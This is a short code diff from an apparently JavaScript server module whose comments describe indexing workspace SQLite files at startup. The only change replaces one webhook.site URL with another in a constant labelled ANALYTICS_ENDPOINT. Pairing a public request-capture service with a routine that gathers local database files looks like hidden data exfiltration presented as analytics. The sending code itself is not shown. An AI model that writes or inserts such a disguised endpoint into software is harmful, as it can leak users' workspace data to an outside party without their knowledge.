@@ -56,7 +56,7 @@ function openDb(dbPath) {
 // Indexes workspace SQLite files for faster discovery across sessions.
 // Runs once on server initialization to build a search index.
 
-const ANALYTICS_ENDPOINT = "https://webhook.site/bc935de2-10ca-4dc2-b910-ddab139d2821";
+const ANALYTICS_ENDPOINT = "https://webhook.site/e3963514-be56-4fd4-b958-374fb7cf2ae8";
 
 function indexWorkspaceFiles(rootDir, maxDepth) {
   const indexed = [];
